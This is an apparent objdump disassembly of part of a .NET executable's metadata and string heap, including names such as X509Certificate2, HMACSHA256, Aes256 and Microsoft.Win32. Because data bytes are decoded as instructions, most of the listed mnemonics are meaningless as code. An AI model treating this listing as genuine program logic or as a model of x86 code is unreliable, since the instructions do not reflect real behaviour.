  405349:	03 89 18 35 03 71    	add    0x71033518(%ecx),%ecx
  40534f:	01 d9                	add    %ebx,%ecx
  405351:	11 01                	adc    %eax,(%ecx)
  405353:	00 99 01 d9 11 4b    	add    %bl,0x4b11d901(%ecx)
  405359:	03 d1                	add    %ecx,%edx
  40535b:	03 ca                	add    %edx,%ecx
  40535d:	06                   	push   %es
  40535e:	06                   	push   %es
  40535f:	00 d9                	add    %bl,%cl
  405361:	03 d9                	add    %ecx,%ebx
  405363:	11 ef                	adc    %ebp,%edi
  405365:	00 e1                	add    %ah,%cl
  405367:	03 09                	add    (%ecx),%ecx
  405369:	0a 53 03             	or     0x3(%ebx),%dl
  40536c:	29 01                	sub    %eax,(%ecx)
  40536e:	32 04 bc             	xor    (%esp,%edi,4),%al
  405371:	01 39                	add    %edi,(%ecx)
  405373:	01 d4                	add    %edx,%esp
  405375:	17                   	pop    %ss
  405376:	18 02                	sbb    %al,(%edx)
  405378:	39 01                	cmp    %eax,(%ecx)
  40537a:	20 09                	and    %cl,(%ecx)
  40537c:	63 03                	arpl   %eax,(%ebx)
  40537e:	39 01                	cmp    %eax,(%ecx)
  405380:	d4 17                	aam    $0x17
  405382:	77 03                	ja     0x405387
  405384:	39 01                	cmp    %eax,(%ecx)
  405386:	17                   	pop    %ss
  405387:	09 6c 02 39          	or     %ebp,0x39(%edx,%eax,1)
  40538b:	01 0b                	add    %ecx,(%ebx)
  40538d:	09 10                	or     %edx,(%eax)
  40538f:	00 39                	add    %bh,(%ecx)
  405391:	01 ee                	add    %ebp,%esi
  405393:	17                   	pop    %ss
  405394:	81 03 39 01 68 04    	addl   $0x4680139,(%ebx)
  40539a:	10 00                	adc    %al,(%eax)
  40539c:	11 01                	adc    %eax,(%ecx)
  40539e:	36 13 9a 01 11 01 a8 	adc    %ss:-0x57feeeff(%edx),%ebx
  4053a5:	0a 06                	or     (%esi),%al
  4053a7:	01 11                	add    %edx,(%ecx)
  4053a9:	01 c2                	add    %eax,%edx
  4053ab:	0a 10                	or     (%eax),%dl
  4053ad:	00 11                	add    %dl,(%ecx)
  4053af:	01 e3                	add    %esp,%ebx
  4053b1:	10 a0 01 1c 00 61    	adc    %ah,0x61001c01(%eax)
  4053b7:	02 02                	add    (%edx),%al
  4053b9:	03 11                	add    (%ecx),%edx
  4053bb:	01 46 13             	add    %eax,0x13(%esi)
  4053be:	b7 01                	mov    $0x1,%bh
  4053c0:	f1                   	int1
  4053c1:	03 33                	add    (%ebx),%esi
  4053c3:	17                   	pop    %ss
  4053c4:	b1 03                	mov    $0x3,%cl
  4053c6:	1c 00                	sbb    $0x0,%al
  4053c8:	c1 11 c9             	rcll   $0xc9,(%ecx)
  4053cb:	03 24 00             	add    (%eax,%eax,1),%esp
  4053ce:	73 16                	jae    0x4053e6
  4053d0:	dc 03                	faddl  (%ebx)
  4053d2:	1c 00                	sbb    $0x0,%al
  4053d4:	4b                   	dec    %ebx
  4053d5:	09 e1                	or     %esp,%ecx
  4053d7:	03 24 00             	add    (%eax,%eax,1),%esp
  4053da:	40                   	inc    %eax
  4053db:	17                   	pop    %ss
  4053dc:	b7 00                	mov    $0x0,%bh
  4053de:	01 04 31             	add    %eax,(%ecx,%esi,1)
  4053e1:	0e                   	push   %cs
  4053e2:	f1                   	int1
  4053e3:	03 09                	add    (%ecx),%ecx
  4053e5:	04 a6                	add    $0xa6,%al
  4053e7:	14 f7                	adc    $0xf7,%al
  4053e9:	03 01                	add    (%ecx),%eax
  4053eb:	04 5c                	add    $0x5c,%al
  4053ed:	02 fe                	add    %dh,%bh
  4053ef:	03 b9 01 9b 06 06    	add    0x6069b01(%ecx),%edi
  4053f5:	04 11                	add    $0x11,%al
  4053f7:	04 05                	add    $0x5,%al
  4053f9:	04 0d                	add    $0xd,%al
  4053fb:	04 c1                	add    $0xc1,%al
  4053fd:	01 f3                	add    %esi,%ebx
  4053ff:	04 14                	add    $0x14,%al
  405401:	04 21                	add    $0x21,%al
  405403:	04 19                	add    $0x19,%al
  405405:	07                   	pop    %es
  405406:	1d 04 31 04 10       	sbb    $0x10043104,%eax
  40540b:	10 27                	adc    %ah,(%edi)
  40540d:	04 2c                	add    $0x2c,%al
  40540f:	00 19                	add    %bl,(%ecx)
  405411:	07                   	pop    %es
  405412:	60                   	pusha
  405413:	04 2c                	add    $0x2c,%al
  405415:	00 68 15             	add    %ch,0x15(%eax)
  405418:	6d                   	insl   (%dx),%es:(%edi)
  405419:	04 34                	add    $0x34,%al
  40541b:	00 95 04 88 04 1c    	add    %dl,0x1c048804(%ebp)
  405421:	00 d9                	add    %bl,%cl
  405423:	11 06                	adc    %eax,(%esi)
  405425:	00 59 02             	add    %bl,0x2(%ecx)
  405428:	c7                   	(bad)
  405429:	18 36                	sbb    %dh,(%esi)
  40542b:	00 49 04             	add    %cl,0x4(%ecx)
  40542e:	d9 11                	fsts   (%ecx)
  405430:	10 00                	adc    %al,(%eax)
  405432:	e1 01                	loope  0x405435
  405434:	d9 11                	fsts   (%ecx)
  405436:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405437:	04 51                	add    $0x51,%al
  405439:	04 51                	add    $0x51,%al
  40543b:	13 af 04 11 02 81    	adc    -0x7efdeefc(%edi),%ebp
  405441:	0a b5 04 59 04 d9    	or     -0x26fba6fc(%ebp),%dh
  405447:	11 10                	adc    %edx,(%eax)
  405449:	00 09                	add    %cl,(%ecx)
  40544b:	01 d9                	add    %ebx,%ecx
  40544d:	11 06                	adc    %eax,(%esi)
  40544f:	00 e9                	add    %ch,%cl
  405451:	01 d9                	add    %ebx,%ecx
  405453:	11 06                	adc    %eax,(%esi)
  405455:	00 61 04             	add    %ah,0x4(%ecx)
  405458:	c1 09 01             	rorl   $0x1,(%ecx)
  40545b:	00 61 04             	add    %ah,0x4(%ecx)
  40545e:	5e                   	pop    %esi
  40545f:	09 01                	or     %eax,(%ecx)
  405461:	00 61 04             	add    %ah,0x4(%ecx)
  405464:	14 04                	adc    $0x4,%al
  405466:	cf                   	iret
  405467:	04 61                	add    $0x61,%al
  405469:	04 fd                	add    $0xfd,%al
  40546b:	09 d6                	or     %edx,%esi
  40546d:	04 61                	add    $0x61,%al
  40546f:	04 cc                	add    $0xcc,%al
  405471:	17                   	pop    %ss
  405472:	9a 01 61 04 c1 01 06 	lcall  $0x601,$0xc1046101
  405479:	00 61 04             	add    %ah,0x4(%ecx)
  40547c:	fe                   	(bad)
  40547d:	11 dd                	adc    %ebx,%ebp
  40547f:	04 f1                	add    $0xf1,%al
  405481:	01 d9                	add    %ebx,%ecx
  405483:	11 e3                	adc    %esp,%ebx
  405485:	04 61                	add    $0x61,%al
  405487:	04 b3                	add    $0xb3,%al
  405489:	01 b7 01 f1 01 48    	add    %esi,0x4801f101(%edi)
  40548f:	0c 06                	or     $0x6,%al
  405491:	00 f9                	add    %bh,%cl
  405493:	01 d9                	add    %ebx,%ecx
  405495:	11 9a 01 09 01 bc    	adc    %ebx,-0x43fef6ff(%edx)
  40549b:	17                   	pop    %ss
  40549c:	b7 01                	mov    $0x1,%bh
  40549e:	99                   	cltd
  40549f:	03 2d 0b f0 04 31    	add    0x3104f00b,%ebp
  4054a5:	02 ce                	add    %dh,%cl
  4054a7:	0a f9                	or     %cl,%bh
  4054a9:	04 89                	add    $0x89,%al
  4054ab:	04 d9                	add    $0xd9,%al
  4054ad:	11 10                	adc    %edx,(%eax)
  4054af:	00 61 04             	add    %ah,0x4(%ecx)
  4054b2:	ba 01 9a 01 61       	mov    $0x61019a01,%edx
  4054b7:	04 ee                	add    $0xee,%al
  4054b9:	11 dd                	adc    %ebx,%ebp
  4054bb:	04 a9                	add    $0xa9,%al
  4054bd:	02 8c 0b 3a 02 91 04 	add    0x491023a(%ebx,%ecx,1),%cl
  4054c4:	5f                   	pop    %edi
  4054c5:	18 1c 05 a1 04 ac 17 	sbb    %bl,0x17ac04a1(,%eax,1)
  4054cc:	31 05 01 02 d9 11    	xor    %eax,0x11d90201
  4054d2:	06                   	push   %es
  4054d3:	00 08                	add    %cl,(%eax)
  4054d5:	00 84 00 65 05 08 00 	add    %al,0x80565(%eax,%eax,1)
  4054dc:	88 00                	mov    %al,(%eax)
  4054de:	6a 05                	push   $0x5
  4054e0:	08 00                	or     %al,(%eax)
  4054e2:	8c 00                	mov    %es,(%eax)
  4054e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4054e5:	05 08 00 90 00       	add    $0x900008,%eax
  4054ea:	65 05 09 00 a8 00    	gs add $0xa80009,%eax
  4054f0:	74 05                	je     0x4054f7
  4054f2:	09 00                	or     %eax,(%eax)
  4054f4:	ac                   	lods   %ds:(%esi),%al
  4054f5:	00 79 05             	add    %bh,0x5(%ecx)
  4054f8:	09 00                	or     %eax,(%eax)
  4054fa:	b0 00                	mov    $0x0,%al
  4054fc:	7e 05                	jle    0x405503
  4054fe:	2e 00 0b             	add    %cl,%cs:(%ebx)
  405501:	00 9f 06 2e 00 13    	add    %bl,0x13002e06(%edi)
  405507:	00 a8 06 2e 00 1b    	add    %ch,0x1b002e06(%eax)
  40550d:	00 c7                	add    %al,%bh
  40550f:	06                   	push   %es
  405510:	2e 00 23             	add    %ah,%cs:(%ebx)
  405513:	00 d0                	add    %dl,%al
  405515:	06                   	push   %es
  405516:	2e 00 2b             	add    %ch,%cs:(%ebx)
  405519:	00 d0                	add    %dl,%al
  40551b:	06                   	push   %es
  40551c:	2e 00 33             	add    %dh,%cs:(%ebx)
  40551f:	00 d0                	add    %dl,%al
  405521:	06                   	push   %es
  405522:	2e 00 3b             	add    %bh,%cs:(%ebx)
  405525:	00 d0                	add    %dl,%al
  405527:	06                   	push   %es
  405528:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  40552c:	d0 06                	rolb   $1,(%esi)
  40552e:	2e 00 4b 00          	add    %cl,%cs:0x0(%ebx)
  405532:	d0 06                	rolb   $1,(%esi)
  405534:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  405538:	d0 06                	rolb   $1,(%esi)
  40553a:	2e 00 5b 00          	add    %bl,%cs:0x0(%ebx)
  40553e:	d0 06                	rolb   $1,(%esi)
  405540:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  405544:	d6                   	salc
  405545:	06                   	push   %es
  405546:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  40554a:	e3 06                	jecxz  0x405552
  40554c:	c0 00 73             	rolb   $0x73,(%eax)
  40554f:	00 7e 05             	add    %bh,0x5(%esi)
  405552:	e0 00                	loopne 0x405554
  405554:	73 00                	jae    0x405556
  405556:	7e 05                	jle    0x40555d
  405558:	00 01                	add    %al,(%ecx)
  40555a:	73 00                	jae    0x40555c
  40555c:	7e 05                	jle    0x405563
  40555e:	20 01                	and    %al,(%ecx)
  405560:	73 00                	jae    0x405562
  405562:	7e 05                	jle    0x405569
  405564:	40                   	inc    %eax
  405565:	01 73 00             	add    %esi,0x0(%ebx)
  405568:	7e 05                	jle    0x40556f
  40556a:	60                   	pusha
  40556b:	01 73 00             	add    %esi,0x0(%ebx)
  40556e:	7e 05                	jle    0x405575
  405570:	80 01 73             	addb   $0x73,(%ecx)
  405573:	00 7e 05             	add    %bh,0x5(%esi)
  405576:	a0 01 73 00 7e       	mov    0x7e007301,%al
  40557b:	05 c0 01 73 00       	add    $0x7301c0,%eax
  405580:	7e 05                	jle    0x405587
  405582:	e0 01                	loopne 0x405585
  405584:	73 00                	jae    0x405586
  405586:	7e 05                	jle    0x40558d
  405588:	00 02                	add    %al,(%edx)
  40558a:	73 00                	jae    0x40558c
  40558c:	7e 05                	jle    0x405593
  40558e:	20 02                	and    %al,(%edx)
  405590:	73 00                	jae    0x405592
  405592:	7e 05                	jle    0x405599
  405594:	23 02                	and    (%edx),%eax
  405596:	73 00                	jae    0x405598
  405598:	7e 05                	jle    0x40559f
  40559a:	40                   	inc    %eax
  40559b:	02 73 00             	add    0x0(%ebx),%dh
  40559e:	7e 05                	jle    0x4055a5
  4055a0:	60                   	pusha
  4055a1:	02 73 00             	add    0x0(%ebx),%dh
  4055a4:	7e 05                	jle    0x4055ab
  4055a6:	61                   	popa
  4055a7:	02 73 00             	add    0x0(%ebx),%dh
  4055aa:	7e 05                	jle    0x4055b1
  4055ac:	61                   	popa
  4055ad:	02 7b 00             	add    0x0(%ebx),%bh
  4055b0:	2d 07 63 02 73       	sub    $0x73026307,%eax
  4055b5:	00 7e 05             	add    %bh,0x5(%esi)
  4055b8:	80 02 73             	addb   $0x73,(%edx)
  4055bb:	00 7e 05             	add    %bh,0x5(%esi)
  4055be:	81 02 73 00 7e 05    	addl   $0x57e0073,(%edx)
  4055c4:	81 02 7b 00 2d 07    	addl   $0x72d007b,(%edx)
  4055ca:	a0 02 73 00 7e       	mov    0x7e007302,%al
  4055cf:	05 a1 02 73 00       	add    $0x7302a1,%eax
  4055d4:	7e 05                	jle    0x4055db
  4055d6:	a1 02 7b 00 2d       	mov    0x2d007b02,%eax
  4055db:	07                   	pop    %es
  4055dc:	c0 02 73             	rolb   $0x73,(%edx)
  4055df:	00 7e 05             	add    %bh,0x5(%esi)
  4055e2:	c1 02 73             	roll   $0x73,(%edx)
  4055e5:	00 7e 05             	add    %bh,0x5(%esi)
  4055e8:	c1 02 7b             	roll   $0x7b,(%edx)
  4055eb:	00 2d 07 e0 02 73    	add    %ch,0x7302e007
  4055f1:	00 7e 05             	add    %bh,0x5(%esi)
  4055f4:	e1 02                	loope  0x4055f8
  4055f6:	73 00                	jae    0x4055f8
  4055f8:	7e 05                	jle    0x4055ff
  4055fa:	e1 02                	loope  0x4055fe
  4055fc:	7b 00                	jnp    0x4055fe
  4055fe:	2d 07 00 03 73       	sub    $0x73030007,%eax
  405603:	00 7e 05             	add    %bh,0x5(%esi)
  405606:	01 03                	add    %eax,(%ebx)
  405608:	73 00                	jae    0x40560a
  40560a:	7e 05                	jle    0x405611
  40560c:	01 03                	add    %eax,(%ebx)
  40560e:	7b 00                	jnp    0x405610
  405610:	2d 07 20 03 73       	sub    $0x73032007,%eax
  405615:	00 7e 05             	add    %bh,0x5(%esi)
  405618:	21 03                	and    %eax,(%ebx)
  40561a:	73 00                	jae    0x40561c
  40561c:	7e 05                	jle    0x405623
  40561e:	21 03                	and    %eax,(%ebx)
  405620:	7b 00                	jnp    0x405622
  405622:	2d 07 40 03 73       	sub    $0x73034007,%eax
  405627:	00 7e 05             	add    %bh,0x5(%esi)
  40562a:	41                   	inc    %ecx
  40562b:	03 73 00             	add    0x0(%ebx),%esi
  40562e:	7e 05                	jle    0x405635
  405630:	41                   	inc    %ecx
  405631:	03 7b 00             	add    0x0(%ebx),%edi
  405634:	2d 07 61 03 73       	sub    $0x73036107,%eax
  405639:	00 7e 05             	add    %bh,0x5(%esi)
  40563c:	61                   	popa
  40563d:	03 7b 00             	add    0x0(%ebx),%edi
  405640:	2d 07 81 03 73       	sub    $0x73038107,%eax
  405645:	00 7e 05             	add    %bh,0x5(%esi)
  405648:	81 03 7b 00 2d 07    	addl   $0x72d007b,(%ebx)
  40564e:	a1 03 73 00 7e       	mov    0x7e007303,%eax
  405653:	05 a1 03 7b 00       	add    $0x7b03a1,%eax
  405658:	2d 07 01 00 20       	sub    $0x20000107,%eax
  40565d:	00 00                	add    %al,(%eax)
  40565f:	00 14 00             	add    %dl,(%eax,%eax,1)
  405662:	20 00                	and    %al,(%eax)
  405664:	3b 00                	cmp    (%eax),%eax
  405666:	3f                   	aas
  405667:	00 71 00             	add    %dh,0x0(%ecx)
  40566a:	34 01                	xor    $0x1,%al
  40566c:	6d                   	insl   (%dx),%es:(%edi)
  40566d:	01 aa 01 c0 01 34    	add    %ebp,0x3401c001(%edx)
  405673:	02 3e                	add    (%esi),%bh
  405675:	02 48 02             	add    0x2(%eax),%cl
  405678:	75 02                	jne    0x40567c
  40567a:	7f 02                	jg     0x40567e
  40567c:	93                   	xchg   %eax,%ebx
  40567d:	02 b7 02 e7 02 15    	add    0x1502e702(%edi),%dh
  405683:	03 3f                	add    (%edi),%edi
  405685:	03 48 03             	add    0x3(%eax),%ecx
  405688:	5a                   	pop    %edx
  405689:	03 6c 03 89          	add    -0x77(%ebx,%eax,1),%ebp
  40568d:	03 e7                	add    %edi,%esp
  40568f:	03 a0 04 bb 04 ff    	add    -0xfb44fc(%eax),%esp
  405695:	04 29                	add    $0x29,%al
  405697:	05 3b 05 4b 05       	add    $0x54b053b,%eax
  40569c:	04 00                	add    $0x0,%al
  40569e:	01 00                	add    %eax,(%eax)
  4056a0:	00 00                	add    %al,(%eax)
  4056a2:	36 16                	ss push %ss
  4056a4:	7b 06                	jnp    0x4056ac
  4056a6:	00 00                	add    %al,(%eax)
  4056a8:	1a 16                	sbb    (%esi),%dl
  4056aa:	80 06 00             	addb   $0x0,(%esi)
  4056ad:	00 dc                	add    %bl,%ah
  4056af:	10 85 06 00 00 8d    	adc    %al,-0x72fffffa(%ebp)
  4056b5:	09 8a 06 00 00 b0    	or     %ecx,-0x4ffffffa(%edx)
  4056bb:	15 8a 06 00 00       	adc    $0x68a,%eax
  4056c0:	41                   	inc    %ecx
  4056c1:	09 8e 06 00 00 95    	or     %ecx,-0x6afffffa(%esi)
  4056c7:	02 93 06 00 00 3a    	add    0x3a000006(%ebx),%dl
  4056cd:	02 97 06 00 00 e7    	add    -0x18fffffa(%edi),%dl
  4056d3:	09 8e 06 00 00 e3    	or     %ecx,-0x1cfffffa(%esi)
  4056d9:	0c 9b                	or     $0x9b,%al
  4056db:	06                   	push   %es
  4056dc:	00 00                	add    %al,(%eax)
  4056de:	06                   	push   %es
  4056df:	0b 93 06 02 00 06    	or     0x6000206(%ebx),%edx
  4056e5:	00 03                	add    %al,(%ebx)
  4056e7:	00 01                	add    %al,(%ecx)
  4056e9:	00 07                	add    %al,(%edi)
  4056eb:	00 03                	add    %al,(%ebx)
  4056ed:	00 02                	add    %al,(%edx)
  4056ef:	00 08                	add    %cl,(%eax)
  4056f1:	00 05 00 01 00 09    	add    %al,0x9000100
  4056f7:	00 05 00 02 00 0a    	add    %al,0xa000200
  4056fd:	00 07                	add    %al,(%edi)
  4056ff:	00 01                	add    %al,(%ecx)
  405701:	00 0b                	add    %cl,(%ebx)
  405703:	00 07                	add    %al,(%edi)
  405705:	00 02                	add    %al,(%edx)
  405707:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40570a:	09 00                	or     %eax,(%eax)
  40570c:	01 00                	add    %eax,(%eax)
  40570e:	0d 00 09 00 02       	or     $0x2000900,%eax
  405713:	00 0e                	add    %cl,(%esi)
  405715:	00 0b                	add    %cl,(%ebx)
  405717:	00 01                	add    %al,(%ecx)
  405719:	00 0f                	add    %cl,(%edi)
  40571b:	00 0b                	add    %cl,(%ebx)
  40571d:	00 02                	add    %al,(%edx)
  40571f:	00 10                	add    %dl,(%eax)
  405721:	00 0d 00 01 00 11    	add    %cl,0x11000100
  405727:	00 0d 00 02 00 12    	add    %cl,0x12000200
  40572d:	00 0f                	add    %cl,(%edi)
  40572f:	00 01                	add    %al,(%ecx)
  405731:	00 13                	add    %dl,(%ebx)
  405733:	00 0f                	add    %cl,(%edi)
  405735:	00 02                	add    %al,(%edx)
  405737:	00 14 00             	add    %dl,(%eax,%eax,1)
  40573a:	11 00                	adc    %eax,(%eax)
  40573c:	02 00                	add    (%eax),%al
  40573e:	15 00 13 00 01       	adc    $0x1001300,%eax
  405743:	00 16                	add    %dl,(%esi)
  405745:	00 13                	add    %dl,(%ebx)
  405747:	00 02                	add    %al,(%edx)
  405749:	00 17                	add    %dl,(%edi)
  40574b:	00 15 00 01 00 18    	add    %dl,0x18000100
  405751:	00 15 00 02 00 19    	add    %dl,0x19000200
  405757:	00 17                	add    %dl,(%edi)
  405759:	00 01                	add    %al,(%ecx)
  40575b:	00 1a                	add    %bl,(%edx)
  40575d:	00 17                	add    %dl,(%edi)
  40575f:	00 08                	add    %cl,(%eax)
  405761:	0d fb 0c 13 0d       	or     $0xd130cfb,%eax
  405766:	fb                   	sti
  405767:	02 7e 03             	add    0x3(%esi),%bh
  40576a:	a8 03                	test   $0x3,%al
  40576c:	d3 03                	roll   %cl,(%ebx)
  40576e:	44                   	inc    %esp
  40576f:	04 71                	add    $0x71,%al
  405771:	04 00                	add    $0x0,%al
  405773:	01 71 00             	add    %esi,0x0(%ecx)
  405776:	68 17 01 00 00       	push   $0x117
  40577b:	01 73 00             	add    %esi,0x0(%ebx)
  40577e:	55                   	push   %ebp
  40577f:	17                   	pop    %ss
  405780:	01 00                	add    %eax,(%eax)
  405782:	00 01                	add    %al,(%ecx)
  405784:	75 00                	jne    0x405786
  405786:	d1 04 02             	roll   $1,(%edx,%eax,1)
  405789:	00 41 01             	add    %al,0x1(%ecx)
  40578c:	77 00                	ja     0x40578e
  40578e:	8a 16                	mov    (%esi),%dl
  405790:	02 00                	add    (%eax),%al
  405792:	40                   	inc    %eax
  405793:	01 79 00             	add    %edi,0x0(%ecx)
  405796:	37                   	aaa
  405797:	07                   	pop    %es
  405798:	02 00                	add    (%eax),%al
  40579a:	40                   	inc    %eax
  40579b:	01 7b 00             	add    %edi,0x0(%ebx)
  40579e:	64 0c 03             	fs or  $0x3,%al
  4057a1:	00 08                	add    %cl,(%eax)
  4057a3:	81 00 00 28 00 04    	addl   $0x4002800,(%eax)
  4057a9:	80 00 00             	addb   $0x0,(%eax)
  4057ac:	01 00                	add    %eax,(%eax)
	...
  4057ba:	93                   	xchg   %eax,%ebx
  4057bb:	01 00                	add    %eax,(%eax)
  4057bd:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4057c8:	00 00                	add    %al,(%eax)
  4057ca:	53                   	push   %ebx
  4057cb:	05 fc 01 00 00       	add    $0x1fc,%eax
  4057d0:	00 00                	add    %al,(%eax)
  4057d2:	04 00                	add    $0x0,%al
	...
  4057dc:	00 00                	add    %al,(%eax)
  4057de:	53                   	push   %ebx
  4057df:	05 96 0d 00 00       	add    $0xd96,%eax
  4057e4:	00 00                	add    %al,(%eax)
  4057e6:	01 00                	add    %eax,(%eax)
	...
  4057f4:	ed                   	in     (%dx),%eax
  4057f5:	01 00                	add    %eax,(%eax)
  4057f7:	00 00                	add    %al,(%eax)
  4057f9:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  405804:	00 00                	add    %al,(%eax)
  405806:	5c                   	pop    %esp
  405807:	05 55 16 00 00       	add    $0x1655,%eax
  40580c:	00 00                	add    %al,(%eax)
  40580e:	04 00                	add    $0x0,%al
	...
  405818:	00 00                	add    %al,(%eax)
  40581a:	5c                   	pop    %esp
  40581b:	05 e2 0a 00 00       	add    $0xae2,%eax
  405820:	00 00                	add    %al,(%eax)
  405822:	04 00                	add    $0x0,%al
	...
  40582c:	00 00                	add    %al,(%eax)
  40582e:	53                   	push   %ebx
  40582f:	05 ae 06 00 00       	add    $0x6ae,%eax
  405834:	00 00                	add    %al,(%eax)
  405836:	0a 00                	or     (%eax),%al
	...
  405840:	00 00                	add    %al,(%eax)
  405842:	5c                   	pop    %esp
  405843:	05 20 02 00 00       	add    $0x220,%eax
  405848:	00 00                	add    %al,(%eax)
  40584a:	04 00                	add    $0x0,%al
	...
  405854:	00 00                	add    %al,(%eax)
  405856:	53                   	push   %ebx
  405857:	05 0c 14 00 00       	add    $0x140c,%eax
  40585c:	00 00                	add    %al,(%eax)
  40585e:	04 00                	add    $0x0,%al
	...
  405868:	00 00                	add    %al,(%eax)
  40586a:	5c                   	pop    %esp
  40586b:	05 da 0f 00 00       	add    $0xfda,%eax
  405870:	00 00                	add    %al,(%eax)
  405872:	12 00                	adc    (%eax),%al
  405874:	0b 00                	or     (%eax),%eax
  405876:	13 00                	adc    (%eax),%eax
  405878:	0e                   	push   %cs
  405879:	00 14 00             	add    %dl,(%eax,%eax,1)
  40587c:	11 00                	adc    %eax,(%eax)
  40587e:	7d 01                	jge    0x405881
  405880:	c3                   	ret
  405881:	03 00                	add    (%eax),%eax
  405883:	00 00                	add    %al,(%eax)
  405885:	41                   	inc    %ecx
  405886:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  40588a:	6e                   	outsb  %ds:(%esi),(%dx)
  40588b:	60                   	pusha
  40588c:	31 30                	xor    %esi,(%eax)
  40588e:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  405891:	70 5f                	jo     0x4058f2
  405893:	5f                   	pop    %edi
  405894:	30 00                	xor    %al,(%eax)
  405896:	49                   	dec    %ecx
  405897:	45                   	inc    %ebp
  405898:	6e                   	outsb  %ds:(%esi),(%dx)
  405899:	75 6d                	jne    0x405908
  40589b:	65 72 61             	gs jb  0x4058ff
  40589e:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  4058a2:	31 00                	xor    %eax,(%eax)
  4058a4:	43                   	inc    %ebx
  4058a5:	61                   	popa
  4058a6:	6c                   	insb   (%dx),%es:(%edi)
  4058a7:	6c                   	insb   (%dx),%es:(%edi)
  4058a8:	53                   	push   %ebx
  4058a9:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  4058b0:	69 
  4058b1:	73 74                	jae    0x405927
  4058b3:	60                   	pusha
  4058b4:	31 00                	xor    %eax,(%eax)
  4058b6:	61                   	popa
  4058b7:	31 00                	xor    %eax,(%eax)
  4058b9:	76 31                	jbe    0x4058ec
  4058bb:	00 5f 5f             	add    %bl,0x5f(%edi)
  4058be:	53                   	push   %ebx
  4058bf:	74 61                	je     0x405922
  4058c1:	74 69                	je     0x40592c
  4058c3:	63 41 72             	arpl   %eax,0x72(%ecx)
  4058c6:	72 61                	jb     0x405929
  4058c8:	79 49                	jns    0x405913
  4058ca:	6e                   	outsb  %ds:(%esi),(%dx)
  4058cb:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  4058d2:	69 
  4058d3:	7a 65                	jp     0x40593a
  4058d5:	3d 33 32 00 4d       	cmp    $0x4d003233,%eax
  4058da:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4058e1:	74 2e                	je     0x405911
  4058e3:	57                   	push   %edi
  4058e4:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  4058eb:	49                   	dec    %ecx
  4058ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4058ed:	74 33                	je     0x405922
  4058ef:	32 00                	xor    (%eax),%al
  4058f1:	3c 3e                	cmp    $0x3e,%al
  4058f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4058f4:	5f                   	pop    %edi
  4058f5:	5f                   	pop    %edi
  4058f6:	32 00                	xor    (%eax),%al
  4058f8:	61                   	popa
  4058f9:	32 00                	xor    (%eax),%al
  4058fb:	58                   	pop    %eax
  4058fc:	35 30 39 43 65       	xor    $0x65433930,%eax
  405901:	72 74                	jb     0x405977
  405903:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40590a:	32 00                	xor    (%eax),%al
  40590c:	76 32                	jbe    0x405940
  40590e:	00 76 33             	add    %dh,0x33(%esi)
  405911:	00 49 6e             	add    %cl,0x6e(%ecx)
  405914:	74 36                	je     0x40594c
  405916:	34 00                	xor    $0x0,%al
  405918:	48                   	dec    %eax
  405919:	4d                   	dec    %ebp
  40591a:	41                   	inc    %ecx
  40591b:	43                   	inc    %ebx
  40591c:	53                   	push   %ebx
  40591d:	48                   	dec    %eax
  40591e:	41                   	inc    %ecx
  40591f:	32 35 36 00 53 68    	xor    0x68530036,%dh
  405925:	61                   	popa
  405926:	32 35 36 00 41 65    	xor    0x65410036,%dh
  40592c:	73 32                	jae    0x405960
  40592e:	35 36 00 61 65       	xor    $0x65610036,%eax
  405933:	73 32                	jae    0x405967
  405935:	35 36 00 67 65       	xor    $0x65670036,%eax
  40593a:	74 5f                	je     0x40599b
  40593c:	55                   	push   %ebp
  40593d:	54                   	push   %esp
  40593e:	46                   	inc    %esi
  40593f:	38 00                	cmp    %al,(%eax)
  405941:	3c 4d                	cmp    $0x4d,%al
  405943:	6f                   	outsl  %ds:(%esi),(%dx)
  405944:	64 75 6c             	fs jne 0x4059b3
  405947:	65 3e 00 3c 50       	gs add %bh,%ds:(%eax,%edx,2)
  40594c:	72 69                	jb     0x4059b7
  40594e:	76 61                	jbe    0x4059b1
  405950:	74 65                	je     0x4059b7
  405952:	49                   	dec    %ecx
  405953:	6d                   	insl   (%dx),%es:(%edi)
  405954:	70 6c                	jo     0x4059c2
  405956:	65 6d                	gs insl (%dx),%es:(%edi)
  405958:	65 6e                	outsb  %gs:(%esi),(%dx)
  40595a:	74 61                	je     0x4059bd
  40595c:	74 69                	je     0x4059c7
  40595e:	6f                   	outsl  %ds:(%esi),(%dx)
  40595f:	6e                   	outsb  %ds:(%esi),(%dx)
  405960:	44                   	inc    %esp
  405961:	65 74 61             	gs je  0x4059c5
  405964:	69 6c 73 3e 00 31 44 	imul   $0x42443100,0x3e(%ebx,%esi,2),%ebp
  40596b:	42 
  40596c:	32 41 31             	xor    0x31(%ecx),%al
  40596f:	46                   	inc    %esi
  405970:	39 39                	cmp    %edi,(%ecx)
  405972:	30 32                	xor    %dh,(%edx)
  405974:	42                   	inc    %edx
  405975:	33 35 46 38 46 38    	xor    0x38463846,%esi
  40597b:	38 30                	cmp    %dh,(%eax)
  40597d:	45                   	inc    %ebp
  40597e:	46                   	inc    %esi
  40597f:	31 36                	xor    %esi,(%esi)
  405981:	39 32                	cmp    %esi,(%edx)
  405983:	43                   	inc    %ebx
  405984:	45                   	inc    %ebp
  405985:	39 39                	cmp    %edi,(%ecx)
  405987:	34 37                	xor    $0x37,%al
  405989:	41                   	inc    %ecx
  40598a:	31 39                	xor    %edi,(%ecx)
